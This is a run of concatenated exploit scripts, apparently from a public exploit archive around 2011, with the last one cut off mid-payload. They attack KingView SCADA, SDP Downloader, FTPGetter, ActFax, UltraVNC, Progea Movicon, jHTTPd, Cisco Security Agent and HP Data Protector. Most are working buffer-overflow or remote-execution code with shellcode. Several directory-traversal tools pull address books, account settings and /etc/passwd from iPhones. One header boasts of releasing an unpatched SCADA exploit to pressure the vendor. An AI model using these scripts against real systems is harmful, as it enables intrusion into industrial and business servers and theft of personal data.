## Thanks to all who share knowledge about heap smashing and heap bypass techniques.

## Notified CERT and the vendor, CERT notified the vendor as well, vendor never responded.
## No patch or response from vendor as of 1/9/2011
## Lets get this into the wild and see how long it takes them to respond.

## Looks like persistence pays off. :-)

## SP2/SP3 targets will be available soon. (putting into metasploit this is just a poc to get response from vendor).
## Vendor: Beijing WellinControl Technology Development Co.,Ltd 
## http://www.wellintek.com

## Beijing WellinControl Technology Development and CHINA CERT were notified on Tue, Sep 28, 2010 at 6:31 AM
## I have made every attempt and yet they choose to ignore...
## This PoC should wake up the dragon. >:-]
## With more to come!

## KingView software is a high-pormance production which can be used to building a data information 
## service platform in automatic field. KingView software can provid graphic visualization which takes 
## your operations management, control and optimization . KingView is widely used in power, 
## water conservancy,buildings, coalmine, environmental protection, metallurgy and so on. 
## And now KingView software is used in national defense, Aero-Space in China. 

## Notes: The HistorySrv process listens on TCP port 777 
## This process does not require any authentication from clients

## An attacker could replace the Flink and Blink pointers with evil ones.. Herrow srweeping dragon. 

## Windows XP SP1 (x86) 
## CommandLine: "C:\Program Files\Kingview\HistorySvr.exe"
## eax=00241eb4 ebx=7ffdf000 ecx=00000003 edx=77f6eb08 esi=00241eb4 edi=00241f48
## eip=77f767cd esp=0012fb38 ebp=0012fc2c iopl=0         nv up ei pl nz na po nc
## cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
## ntdll!DbgBreakPoint:
## 77f767cd cc              int     3
## 0:000> g
## ModLoad: 71950000 71a34000   C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.10.0_x-ww_f7fb5805\comctl32.dll
## ModLoad: 5ad70000 5ada4000   C:\WINDOWS\System32\uxtheme.dll
## ModLoad: 71a50000 71a8b000   C:\WINDOWS\system32\mswsock.dll
## ModLoad: 71a90000 71a98000   C:\WINDOWS\System32\wshtcpip.dll
## (318.6d4): Access violation - code c0000005 (first chance)
## First chance exceptions are reported before any exception handling.
## This exception may be expected and handled.
## eax=42424242 ebx=00000285 ecx=44444444 edx=00d38110 esi=00d38110 edi=003a0000
## eip=77f6256f esp=0012f36c ebp=0012f584 iopl=0         nv up ei pl zr na pe nc
## cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00010246
## ntdll!RtlAllocateHeapSlowly+0x6bd:
## 77f6256f 8901            mov     dword ptr [ecx],eax  ds:0023:44444444=????????
## 0:000> u
## ntdll!RtlAllocateHeapSlowly+0x6bd:
## 77f6256f 8901            mov     dword ptr [ecx],eax
## 77f62571 894804          mov     dword ptr [eax+4],ecx
## 77f62574 3bc1            cmp     eax,ecx
## 77f62576 7534            jne     ntdll!RtlAllocateHeapSlowly+0x6fa (77f625ac)
## 77f62578 668b06          mov     ax,word ptr [esi]
## 77f6257b 663d8000        cmp     ax,80h
## 77f6257f 732b            jae     ntdll!RtlAllocateHeapSlowly+0x6fa (77f625ac)
## 77f62581 0fb7c8          movzx   ecx,ax


## usage python exploit.py 127.0.0.1 777

import os
import socket
import sys

host = sys.argv[1]
port = int(sys.argv[2])

print " KingView 6.53 SCADA HMI Heap Smashing Exploit "
print " Credits: D1N | twitter.com/D1N "

shellcode = ("\x33\xC0\x50\x68\x63\x61\x6C\x63\x54\x5B\x50\x53\xB9"
"\x44\x80\xc2\x77" 
"\xFF\xD1\x90\x90") 

exploit = ("\x90" * 1024 + "\x44" * 31788) 
exploit += ("\xeb\x14") # our JMP (over the junk and into nops) 
exploit += ("\x44" * 6) 
exploit += ("\xad\xbb\xc3\x77") # ECX 0x77C3BBAD --> call dword ptr ds:[EDI+74] 
exploit += ("\xb4\x73\xed\x77") # EAX 0x77ED73B4 --> UnhandledExceptionFilter() 
exploit += ("\x90" * 21) 
exploit += shellcode

print "  [+] Herrow Sweeping Dragon..."
print "  [+] Sending payload..."

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
s.connect((host,port)) 
s.send(exploit)  
data = s.recv(1024)

print "  [+] Closing connection.." 
s.close()  
print "  [+] Done!" #!/usr/bin/python
#Bug : SDP Downloader (http_response) Remote Buffer Overflow Exploit
# by: sup3r
#Tested on : Xp sp3
#http://sdp.ppona.com/

from socket import *

# win32_exec -  EXITFUNC=process CMD=calc Size=160 Encoder=PexFnstenvSub http://metasploit.com
shellcode=(
"\x33\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x71"
"\xf3\x2a\x67\x83\xeb\xfc\xe2\xf4\x8d\x1b\x6e\x67\x71\xf3\xa1\x22"
"\x4d\x78\x56\x62\x09\xf2\xc5\xec\x3e\xeb\xa1\x38\x51\xf2\xc1\x2e"
"\xfa\xc7\xa1\x66\x9f\xc2\xea\xfe\xdd\x77\xea\x13\x76\x32\xe0\x6a"
"\x70\x31\xc1\x93\x4a\xa7\x0e\x63\x04\x16\xa1\x38\x55\xf2\xc1\x01"
"\xfa\xff\x61\xec\x2e\xef\x2b\x8c\xfa\xef\xa1\x66\x9a\x7a\x76\x43"
"\x75\x30\x1b\xa7\x15\x78\x6a\x57\xf4\x33\x52\x6b\xfa\xb3\x26\xec"
"\x01\xef\x87\xec\x19\xfb\xc1\x6e\xfa\x73\x9a\x67\x71\xf3\xa1\x0f"
"\x4d\xac\x1b\x91\x11\xa5\xa3\x9f\xf2\x33\x51\x37\x19\x8d\xf2\x85"
"\x02\x9b\xb2\x99\xfb\xfd\x7d\x98\x96\x90\x4b\x0b\x12\xf3\x2a\x67")

buffer =  '\x41'*4
buffer += shellcode
buffer += '\x41'*(65584-len(shellcode))
buffer += '\xF0\xF1\xAB\x00'	
#00ABF1F0(shellcode address)
buffer += '\x41'*36
buffer += '\xBC\xEB\x12\x00'	
#0012EBBC Stack section (writable)
buffer += '\x43'*9000

header=(
"HTTP/1.1 200 OK\r\n"
"Content-Type: video/"+buffer+"\r\n"
"Last-Modified: 20 Mar 2010 09:50:10 GMT\r\n"
"Accept-Ranges: bytes\r\n"
"ETag: \"075a1fc3d4dc41:0\"\r\n"
"Server: Microsoft-IIS/7.5\r\n"
"X-Powered-By: ASP.NET\r\n"
"Date: Sat, 20 Mar 2010 14:31:46 GMT\r\n"
"Connection: close\r\n"
"Content-Length: 324\r\n\r\n")

s = socket(AF_INET, SOCK_STREAM)
s.bind(("0.0.0.0", 80))
s.listen(1)
print "[+] Listening on [HTTP] 80"
c, addr = s.accept()
print "[+] Connection accepted from: %s" % (addr[0])
c.recv(1024)
c.send(header)
c.send(header)
raw_input("[+] Done, press enter to quit")
c.close()
s.close()

#!/usr/bin/python

# Exploit Title: FTPGetter v3.58.0.21 Buffer Overflow (PASV) Exploit
# Date: 02/03/2011
# Author: modpr0be
# Software Link: http://www.ftpgetter.com/ftpgetter_setup.exe
# Vulnerable version: <= 3.58.0.21
# Tested on: Windows XP SP3 (VMware Player 3.1.3 build-324285)
# CVE : N/A

# ======================================================================
#        ___       _ __        __            __    _     __
#   ____/ (_)___ _(_) /_____ _/ / ___  _____/ /_  (_)___/ /___  ____ _
#  / __  / / __ `/ / __/ __ `/ / / _ \/ ___/ __ \/ / __  / __ \/ __ `/
# / /_/ / / /_/ / / /_/ /_/ / / /  __/ /__/ / / / / /_/ / / / / /_/ /
# \__,_/_/\__, /_/\__/\__,_/_/  \___/\___/_/ /_/_/\__,_/_/ /_/\__,_/
#        /____/                          http://www.digital-echidna.org
# ======================================================================
#
# Greetz:
#   say hello to all digital-echidna org crew:
#     otoy, cipherstring, bean, s3o, d00m, n0rf0x, fm, gotechidna, manix
#   special thx:
#     otoy, cipherstring, cyb3r.anbu, oebaj.
#   help for documentation:   	
#     offsec, exploit-db, corelan-team, 5M7X, loneferret.
#

#### Software description:
# Save time on FTP/SFTP updates! Plan your uploads and automate the workflow. 
# Schedule and automate file transfers with a centralized console. Let your 
# computer move or synchronize information securely between home and office 
# automatically according to the schedule!
#
#### Exploit information:
# There was an error when sending a response to the PASV command. 
# Fortunately, these errors lead to buffer overflows. 
# This exploit is unstable. It should only be used as a POC.
# I tried several times on various systems,  
# the buffer sometimes changed.
# 
### Some Conditions:
# This POC is using "the most selling feature" Automated FTP Request.
# So this POC, I use Auto Download with / as the Source Files.
# Scheduler Settings also set to Repetitive.
# Make sure to run the program first before this POC.
# 
#### Other information:
# It's a part of "Death of an FTP Client" :)
# For more information, loot at here:
# http://www.corelan.be:8800/index.php/2010/10/12/death-of-an-ftp-client/
#
##

from socket import *
import struct
import time

total = 1000
junk1 = "\x41" * 485
nseh = "\xeb\x06\x90\x90"
seh = struct.pack('<L', 0x1001A149) # ppr from ssleay32.dll
nops = "\x90" * 8

# msfpayload windows/exec CMD=calc R | msfencode -t c 
# [*] x86/shikata_ga_nai succeeded with size 223 (iteration=1)
# BadChars \x00\xff\x0d\x5c\x2f\x0a

shellcode = (
"\xdb\xd1\xd9\x74\x24\xf4\x5a\x31\xc9\xb1\x32\xb8\xca\xea\xc0"
"\x1f\x31\x42\x17\x83\xc2\x04\x03\x88\xf9\x22\xea\xf0\x16\x2b"
"\x15\x08\xe7\x4c\x9f\xed\xd6\x5e\xfb\x66\x4a\x6f\x8f\x2a\x67"
"\x04\xdd\xde\xfc\x68\xca\xd1\xb5\xc7\x2c\xdc\x46\xe6\xf0\xb2"
"\x85\x68\x8d\xc8\xd9\x4a\xac\x03\x2c\x8a\xe9\x79\xdf\xde\xa2"
"\xf6\x72\xcf\xc7\x4a\x4f\xee\x07\xc1\xef\x88\x22\x15\x9b\x22"
"\x2c\x45\x34\x38\x66\x7d\x3e\x66\x57\x7c\x93\x74\xab\x37\x98"
"\x4f\x5f\xc6\x48\x9e\xa0\xf9\xb4\x4d\x9f\x36\x39\x8f\xe7\xf0"
"\xa2\xfa\x13\x03\x5e\xfd\xe7\x7e\x84\x88\xf5\xd8\x4f\x2a\xde"
"\xd9\x9c\xad\x95\xd5\x69\xb9\xf2\xf9\x6c\x6e\x89\x05\xe4\x91"
"\x5e\x8c\xbe\xb5\x7a\xd5\x65\xd7\xdb\xb3\xc8\xe8\x3c\x1b\xb4"
"\x4c\x36\x89\xa1\xf7\x15\xc7\x34\x75\x20\xae\x37\x85\x2b\x80"
"\x5f\xb4\xa0\x4f\x27\x49\x63\x34\xd7\x03\x2e\x1c\x70\xca\xba"
"\x1d\x1d\xed\x10\x61\x18\x6e\x91\x19\xdf\x6e\xd0\x1c\x9b\x28"
"\x08\x6c\xb4\xdc\x2e\xc3\xb5\xf4\x4c\x82\x25\x94\x92")

junk2 = "\x90" * (total - len(junk1+nseh+seh+nops+shellcode))
payload = junk1+nseh+seh+nops+shellcode+junk2

host = "0.0.0.0"
port = 21

s = socket(AF_INET, SOCK_STREAM)
s.bind((host, port))
s.listen(1)

print "\n[+] FTPGetter v3.58.0.21 Buffer Overflow POC"
print "[+] by modpr0be[at]digital-echidna[dot]org."
print "============================================="
print "[+] Evil FTP Server Started."
print "[+] Listening on %d ..." % port

cl, addr = s.accept()
print "[+] Connection accepted from %s" % addr[0]
print "[+] Whatever for username and password."

def hajar():
	welcome = "220 Welcome to EvilFTP Server\r\n"
	cl.send(welcome)
	cl.recv(1024)
	cl.send("331 User name okay, need password\r\n")	# received USER
	cl.recv(1024)
	cl.send("230-Password accepted\r\n")		# received PASS
	cl.send("230 User logged in.\r\n")
	cl.recv(1024)
	cl.send("215 UNIX Type: L8\r\n")   # received from SYST
	cl.recv(1024)
	cl.send("200 Type set to I\r\n")	# received from TYPE I
	cl.recv(1024)
	cl.send("200 OK\r\n")			# received from REST 0
	cl.recv(1024)
	cl.send("200 Command not Understood\r\n")	# received from OPTS UTF8 OFF
	cl.recv(1024)
	cl.send("257 \"/\" is current directory\r\n")	# received from PWD
	cl.recv(1024)
	cl.send("250 CWD Command successful.\r\n")
	cl.recv(1024)
	cl.send("257 \"/\" is current directory\r\n")	# received from PWD
	cl.recv(1024)
	cl.send("200 Type set to I\r\n")	# received from TYPE I
	cl.recv(1024)
	print "[+] Begin sending evil passive mode.."
	cl.send("227 Entering Passive Mode ("+payload+",1,1,1,1,1)\r\n")	# this is the junk from passive mode
	cl.recv(1024)
	cl.close() 

hajar()
time.sleep(3)
print "[+] Skadush! Calculator will pop out..\r\n" 

s.close()
#!/usr/bin/python
# Exploit Title: ActFax Server FTP Remote BOF (post auth)
# Date: Feb 15, 2011
# Author: chap0
# Software Link: http://www.actfax.com/download/actfax_setup_en.exe
# Version: Version 4.25, Build 0221 (2010-02-11)
# Tested on: Windows XP SP3 en
# Big thanks to Sud0 - and an extra greetz to mr_me -RESPECT
# Stay true my friends

import socket

print "\nActFax Server FTP Remote BOF"
print " chap0 - www.seek-truth.net \n"

# pops calc
calccode = "PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJINkXlqELKZL587Pep7PdoaxsSSQbLPcLMw5JXbpX8KwOcHBPwkON0A"

# push ebp #pop eax #sub eax,55555521 * 3 :)
junk = "\x55\x58\x2D\x21\x55\x55\x55\x2D\x21\x55\x55\x55\x2D\x21\x55\x55\x55" + "C"*135 + calccode + "A"*(616-len(calccode))

payload = junk + "\x37\x27\x40\x00" #RETN

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.1.2',21))
s.recv(1024)
s.send('USER ' + 'chapo\r\n')
print (s.recv(1024))
s.send('PASS chapo\r\n')
print (s.recv(1024))
s.send('RETR ' + payload + '\r\n')
s.close
----------------------------------------------------------------
Software : iPhone Folders 2.5
Type of vunlnerability : Directory Traversal
Tested On : iPhone 4 (IOS 4.0.1)
Risk of use : High
----------------------------------------------------------------
Program Developer : http://itunes.apple.com/app/folders-private-file-storage/id287950258?mt=8
----------------------------------------------------------------
Discovered by : Khashayar Fereidani
Team Website : Http://IRCRASH.COM
Team Members : Khashayar Fereidani - Sina YazdanMehr - Arash Allebrahim
English Forums : Http://IRCRASH.COM/forums/
Email : irancrash [ a t ] gmail [ d o t ] com
Facebook : http://facebook.com/fereidani
----------------------------------------------------------------

Exploit:

#!/usr/bin/python
import urllib2
def urlread(url,file):
	url = url+"/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"+file
	u = urllib2.urlopen(url)
	localFile = open('result.html', 'w')
	localFile.write(u.read())
	localFile.close()
	print "file saved as result.html\nIRCRASH.COM 2011"
print "----------------------------------------\n- iPhone Folders 2.5 DT                 -\n- Discovered by : Khashayar Fereidani  -\n- http://ircrash.com/                  -\n----------------------------------------"
url = raw_input("Enter Address ( Ex. : http://192.168.1.101:8080 ):")
f = ["","/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb","/private/var/mobile/Library/Safari","/private/var/mobile/Library/Preferences/com.apple.accountsettings.plist","/private/var/mobile/Library/Preferences/com.apple.conference.plist","/etc/passwd"]
print f[1]
id = int(raw_input("1 : Phone Book\n2 : Safari Fav\n3 : Users Email Info\n4 : Network Informations\n5 : Passwd File\n6 : Manual File Selection\n Enter ID:"))
if not('http:' in url):
	url='http://'+url
if ((id>0) and (id<6)):
	file=f[id]
	urlread(url,file)
if (id==6):
	file=raw_input("Enter Local File Address : ")
	urlread(url,file)
----------------------------------------------------------------
Software : iPhone iFile 2.0
Type of vunlnerability : Directory Traversal
Tested On : iPhone 4 (IOS 4.0.1)
Risk of use : High
----------------------------------------------------------------
Program Developer : http://ax.itunes.apple.com/app/id307458094?mt=8
----------------------------------------------------------------
Discovered by : Khashayar Fereidani
Team Website : Http://IRCRASH.COM
Team Members : Khashayar Fereidani - Sina YazdanMehr - Arash Allebrahim
English Forums : Http://IRCRASH.COM/forums/
Email : irancrash [ a t ] gmail [ d o t ] com
Facebook : http://facebook.com/fereidani
----------------------------------------------------------------

Exploit:
#!/usr/bin/python
import urllib2
def urlread(url,file):
	url = url+"/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"+file
	u = urllib2.urlopen(url)
	localFile = open('result.html', 'w')
	localFile.write(u.read())
	localFile.close()
	print "file saved as result.html\nIRCRASH.COM 2011"
print "----------------------------------------\n- iPhone iFile 2.0 DT                  -\n- Discovered by : Khashayar Fereidani  -\n- http://ircrash.com/                  -\n----------------------------------------"
url = raw_input("Enter Address ( Ex. : http://192.168.1.101:8080 ):")
f = ["","/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb","/private/var/mobile/Library/Safari","/private/var/mobile/Library/Preferences/com.apple.accountsettings.plist","/private/var/mobile/Library/Preferences/com.apple.conference.plist","/etc/passwd"]
print f[1]
id = int(raw_input("1 : Phone Book\n2 : Safari Fav\n3 : Users Email Info\n4 : Network Informations\n5 : Passwd File\n6 : Manual File Selection\n Enter ID:"))
if not('http:' in url):
	url='http://'+url
if ((id>0) and (id<6)):
	file=f[id]
	urlread(url,file)
if (id==6):
	file=raw_input("Enter Local File Address : ")
	urlread(url,file)
----------------------------------------------------------------
Software : iPhone MyDocs 2.7
Type of vunlnerability : Directory Traversal
Tested On : iPhone 4 (IOS 4.0.1)
Risk of use : High
----------------------------------------------------------------
Program Developer : http://ax.itunes.apple.com/app/id358347809?mt=8
----------------------------------------------------------------
Discovered by : Khashayar Fereidani
Team Website : Http://IRCRASH.COM
Team Members : Khashayar Fereidani - Sina YazdanMehr - Arash Allebrahim
English Forums : Http://IRCRASH.COM/forums/
Email : irancrash [ a t ] gmail [ d o t ] com
Facebook : http://facebook.com/fereidani
----------------------------------------------------------------

Exploit:

#!/usr/bin/python
import urllib2
def urlread(url,file):
	url = url+"/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"+file
	u = urllib2.urlopen(url)
	localFile = open('result.html', 'w')
	localFile.write(u.read())
	localFile.close()
	print "file saved as result.html\nIRCRASH.COM 2011"
print "----------------------------------------\n- iPhone MyDocs 2.7 DT                 -\n- Discovered by : Khashayar Fereidani  -\n- http://ircrash.com/                    -\n----------------------------------------"
url = raw_input("Enter Address ( Ex. : http://192.168.1.101 ):")
f = ["","/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb","/private/var/mobile/Library/Safari","/private/var/mobile/Library/Preferences/com.apple.accountsettings.plist","/private/var/mobile/Library/Preferences/com.apple.conference.plist","/etc/passwd"]
print f[1]
id = int(raw_input("1 : Phone Book\n2 : Safari Fav\n3 : Users Email Info\n4 : Network Informations\n5 : Passwd File\n6 : Manual File Selection\n Enter ID:"))
if not('http:' in url):
	url='http://'+url
if ((id>0) and (id<6)):
	file=f[id]
	urlread(url,file)
if (id==6):
	file=raw_input("Enter Local File Address : ")
	urlread(url,file)
# Exploit Title: iPod Touch/iPhone iFileExplorer Free Directory Traversal
# Date: 04/03/2011 #UK date format
# Author: theSmallNothing
# Software Link: http://itunes.apple.com/gb/app/ifileexplorer-protect-multi/id355253462?mt=8
# Version: 2.8
# Tested on: iPod Touch 2G (4.1)

import urllib, sqlite3

base = "http://192.168.0.3/" #Change to iDevice ip
url = base + "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/var/mobile/Library/AddressBook/AddressBook.sqlitedb" #Jailbroken Address

try:
    urllib.urlretrieve(url,"addressbook.sqlite")
    print "Grabbed Address Book\n"
except:
    print "Could not grab address book..."

conn = sqlite3.connect("addressbook.sqlite")
cursor = conn.cursor()
cmd = "SELECT * FROM ABPerson"
cursor.execute(cmd)
results = cursor.fetchall()
for person in results:
    if person[1] == None:
        continue
    print person[1], person[2]
    
    cmd = "SELECT * FROM ABMultiValue WHERE record_id="+str(person[0])
    cursor.execute(cmd)
    vunDataArr = cursor.fetchall()
    for vunData in vunDataArr:
        if vunData[5] != None:
            print "\t"+vunData[5]
#!/usr/bin/python

#Ultr@VNC 1.0.1 Client Buffer Overflow - Luigi Auriemm
#POC by Paul Haas at Redspin.com
#Tested on WinXP SP 2: Launches Calc
import socket, struct

HOST = ''                       # Localhost
PORT = 5900                     # VNC Server
BOFSZ = 1024                    # Buffer Size
HEAD = "RFB 003.006\n"          # VNC Header
MESSAGE = "Requires Ultr@VNC Authentication\n"
NOP = "\x90"                    # Standard x86 NOP
JMP = "\xE9\x1B\xFC\xFF\xFF"    # JMP To BUFF
ESP = "\xE0\x3A\xB4\x76"        # winmm.dll: JMP %esp
POP = "PASSWORD"                # RET 8

# win32_exec - CMD=calc Size=160 http://metasploit.com
SHELLCODE = \
"\x31\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xe1"+\
"\x7c\x05\xd9\x83\xeb\xfc\xe2\xf4\x1d\x94\x41\xd9\xe1\x7c\x8e\x9c"+\
"\xdd\xf7\x79\xdc\x99\x7d\xea\x52\xae\x64\x8e\x86\xc1\x7d\xee\x90"+\
"\x6a\x48\x8e\xd8\x0f\x4d\xc5\x40\x4d\xf8\xc5\xad\xe6\xbd\xcf\xd4"+\
"\xe0\xbe\xee\x2d\xda\x28\x21\xdd\x94\x99\x8e\x86\xc5\x7d\xee\xbf"+\
"\x6a\x70\x4e\x52\xbe\x60\x04\x32\x6a\x60\x8e\xd8\x0a\xf5\x59\xfd"+\
"\xe5\xbf\x34\x19\x85\xf7\x45\xe9\x64\xbc\x7d\xd5\x6a\x3c\x09\x52"+\
"\x91\x60\xa8\x52\x89\x74\xee\xd0\x6a\xfc\xb5\xd9\xe1\x7c\x8e\xb1"+\
"\xdd\x23\x34\x2f\x81\x2a\x8c\x21\x62\xbc\x7e\x89\x89\x8c\x8f\xdd"+\
"\xbe\x14\x9d\x27\x6b\x72\x52\x26\x06\x1f\x64\xb5\x82\x7c\x05\xd9"

#buff = MESSAGE+SHELLCODE+NOP SLED+RET ADDR+USELESS+JUMP TO BUFF
buff = MESSAGE+SHELLCODE+NOP*(BOFSZ-11-len(MESSAGE)-len(SHELLCODE))
buff = buff+ESP+POP+JMP

#Egg = VNC Server Error Reply and Size of Reply + buff
egg = struct.pack('LL',socket.htonl(0),socket.htonl(len(buff)))+buff

print 'Ultr@VNC 1.0.1 Client Buffer Overflow - Luigi Auriemma'
print 'POC by Paul Haas at Redspin.com'
print 'Server listening on port', PORT

#Server Loop
while(1):
       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       s.bind((HOST, PORT))
       s.listen(1)

       conn, addr = s.accept()
       print 'Connection by', addr

       conn.send(HEAD)
       data = conn.recv(12)

       conn.send(egg)
       conn.close()

# milw0rm.com [2006-04-11]
#!/usr/bin/python
# movi.py
# Progea Movicon TCPUploadServer Remote Exploit
# Jeremy Brown / jbrown at patchtuesday dot org
# Mar 2011
#
# TCPUploadServer allows remote users to execute functions on the server
# without any form of authentication. Impacts include deletion of arbitrary
# files, execution of a program with an arbitrary argument, crashing the
# server, information disclosure, and more. This design flaw puts the host
# running this server at risk of potentially unauthorized functions being
# executed on the system.
#
# Tested on Progea Movicon 11 TCPUploadServer running on Windows
#
# Fix: http://support.progea.com/download/Mov11.2_Setup.zip
#

import sys
import socket

hdr="MovX"

funcs=(1,2,3,4,5,6,7,8) # "B" is listed as 8 only for convience. other functions include (the real) 8, 9, A, and V

if len(sys.argv)<3:
     print "Progea Movicon TCPUploadServer Remote Exploit"
     print "Usage: %s <target> <function> [data]"%sys.argv[0]
     print "\nWhat would you like to do?\n"
     print "[1] Create a folder"
     print "[2] Overwrite a file with NULL and cause 100%% CPU"
     print "[3] Delete a file"
     print "[4] Execute moviconRunTime.exe with a specified argument"
     print "[5] Create a desktop shortcut"
     print "[6] Retrieve drive information"
     print "[7] Retrieve os service pack"
     print "[8] Crash the server\n"
     print "* Default data is \"test\""
     sys.exit(0)

target=sys.argv[1]
port=10651
cs=target,port

func=int(sys.argv[2])

if len(sys.argv)==4:
     data=sys.argv[3]
else:
     data="test"

if func not in funcs:
     print "Invalid function"
     sys.exit(1)

if(func==1):
     print "Crafting a packet to create the folder \"%s\"..."%data
     pkt=hdr+"1"+"B"+data+"\x00"*(66-len(data))

elif(func==2):
     print "Crafting a packet to truncate (or create) the file \"%s\" to 0 bytes and cause 100%% CPU..."%data
     pkt=hdr+"2"+"B"+data+"\x00"*(66-len(data))
     # O_RDWR|O_CREAT|O_TRUNC, might be more to this, it's supposedly a copy function, but i'm moving on

elif(func==3):
     print "Crafting a packet to delete the file \"%s\"..."%data
     pkt=hdr+"3"+"B"+data+"\x00"*(66-len(data))

elif(func==4):
     print "Crafting a packet to execute moviconRunTime.exe with the argument \"%s\"..."%data
     pkt=hdr+"4"+"BB"+data+"\x00"*(65-len(data))

elif(func==5):
     print "Crafting a packet to create a desktop shortcut with the name (also appended to the link path) \"%s\"..."%data
     pkt=hdr+"5"+"B"+data+"\x00"*(66-len(data))

elif(func==6):
     print "Crafting a packet to retrieve drive information..."
     pkt=hdr+"6"+"\x01"

elif(func==7):
     print "Crafting a packet to retrieve os service pack..."
     pkt=hdr+"7"+"\x00"

elif(func==8):
     print "Crafting a packet to crash the server..."
     pkt=hdr+"B"+"\x00"

sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect(cs)

sock.send(pkt)
sock.send(pkt)

print "\nPacket sent!"

if((func==6)|(func==7)):
     info=sock.recv(128)
     
     if(info):
          print "\nRetrieved info:\n"
          if(func==6):
               print "%s"%info[6:]
          elif(func==7):
               print "%s"%info[22:]
     else:
          print "\nNo info"

sock.close()
# ------------------------------------------------------------------------
# Software................jHTTPd 0.1a
# Vulnerability...........Directory Traversal
# Threat Level............Serious (3/5)
# Download................http://developer.gauner.org/jhttpd/
# Discovery Date..........3/28/2011
# Tested On...............Windows Vista + XAMPP
# ------------------------------------------------------------------------
# Author..................AutoSec Tools
# Site....................http://www.autosectools.com/
# Email...................John Leitch <john@autosectools.com>
# ------------------------------------------------------------------------
# 
# 
# --Description--
# 
# A directory traversal vulnerability in jHTTPd 0.1a can be exploited to
# read files outside of the web root.
# 
# 
# --Exploit--
# 
# ..\/
# ..//
# ..\
# ../
# 
# 
# --PoC--

import socket, urllib

host = 'localhost'
port = 8082
file = 'windows/win.ini'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.settimeout(8)    

print 'sending'

s.send('GET ' + '../' * 16 + file + ' HTTP/1.1\r\n'
    'Host: ' + host + '\r\n\r\n')
print s.recv(8192) + s.recv(8192)#!/usr/bin/env python
# Exploits Cisco Security Agent Management Console ‘st_upload’ (CVE-2011-0364)
# gerry eisenhaur <gerry.eisenhaur _at_ gmail.com>

import httplib
import mimetools
import StringIO

_boundary = mimetools.choose_boundary()
_host_uid = 'C087EFAE-05A2-4A0B-9512-E05E5ED84AEB'
_csamc = "192.168.0.108"

# we need to enable some scripting to get command access
htaccess = "Options +Includes +ExecCGI\r\nAddHandler cgi-script gee"
perl_path = "#!c:/program files/cisco/csamc/csamc60/perl/5.8.7/bin/mswin32-x86/perl\r\n",
backdoor = "exec \"calc.exe\";"

def send_request(params=None):
    buf = StringIO.StringIO()
    headers = {"Content-type": 'multipart/form-data; boundary=%s' % _boundary}

    for(key, value) in params.iteritems():
        buf.write('--%s\r\n' % _boundary)
        buf.write('Content-Disposition: form-data; name="%s"' % key)
        buf.write('\r\n\r\n%s\r\n' % value)
    buf.write('--' + _boundary + '--\r\n\r\n')
    body = buf.getvalue()

    conn = httplib.HTTPSConnection(_csamc)
    conn.request("POST", "/csamc60/agent", body, headers)
    response = conn.getresponse()
    print response.status, response.reason
    conn.close()

def main():
    ### Build up required dir tree
    dirtree = ["../bin/webserver/htdocs/diag/bin",
               "../bin/webserver/htdocs/diag/bin/webserver",
               "../bin/webserver/htdocs/diag/bin/webserver/htdocs"]
    _params = {
        'host_uid': _host_uid,
        'jobname': None,
        'host': "aa",
        'diags': " ",
        'diagsu': " ",
        'profiler': " ",
        'extension': "gee",
    }
    for path in dirtree:
        print "[+] Creating directory: %s" % path
        _params['jobname'] = path
        send_request(_params)

    ### Done building path, drop files
    print "[+] Dropping .htaccess"
    send_request({
        'host_uid': _host_uid,
        'jobname': '',
        'host': "/../bin/webserver/",
        'diags': "",
        'diagsu': "",
        'profiler': htaccess,
        'extension': "/../.htaccess",
    })

    print "[+] Dropping payload"
    send_request({
        'host_uid': _host_uid,
        'jobname': '',
        'host': "/../bin/webserver/htdocs/gerry",
        'diags': perl_path,
        'diagsu': "",
        'profiler': backdoor,
        'extension': "/../exploit.gee",
    })

    print "[+] Done, Executing dropped file."
    try:
        conn = httplib.HTTPSConnection(_csamc, timeout=1)
        conn.request("GET", "/csamc60/exploit.gee")
        response = conn.getresponse()
        print response.status, response.reason
        print response.read()
    except httplib.ssl.SSLError:
        pass
    print "[+] Finished."

if __name__ == '__main__':
    main()
# Exploit Title: HP Data Protector Client EXEC_CMD Remote Code Execution Vulnerability PoC (ZDI-11-055)
# Date: 2011-05-28
# Author: @fdiskyou
# e-mail: rui at deniable.org
# Version: 6.11
# Tested on: Windows 2003 Server SP2 en
# CVE: CVE-2011-0923
# Notes: ZDI-11-055
# Reference: http://www.zerodayinitiative.com/advisories/ZDI-11-055/
# Reference: http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02781143
#
# Greetz to all the Exploit-DB Dev Team.

import socket
import sys

if len(sys.argv) != 3:
    print "Usage: ./ZDI-11-055.py <Target IP> <Port>"
    sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])

# The following PoC takes advantage of a Directory Path Traversal to execute ipconfig.exe on the remote host. 
# Tweak payload to better suit your needs.
payload = (
"\x00\x00\x00\xa4\x20\x32\x00\x20\x66\x64\x69\x73\x6b\x79\x6f\x75"
"\x00\x20\x30\x00\x20\x53\x59\x53\x54\x45\x4d\x00\x20\x66\x64\x69"
"\x73\x6b\x79\x6f\x75\x00\x20\x43\x00\x20\x32\x30\x00\x20\x66\x64"
"\x69\x73\x6b\x79\x6f\x75\x00\x20\x50\x6f\x63\x00\x20\x4e\x54\x41"
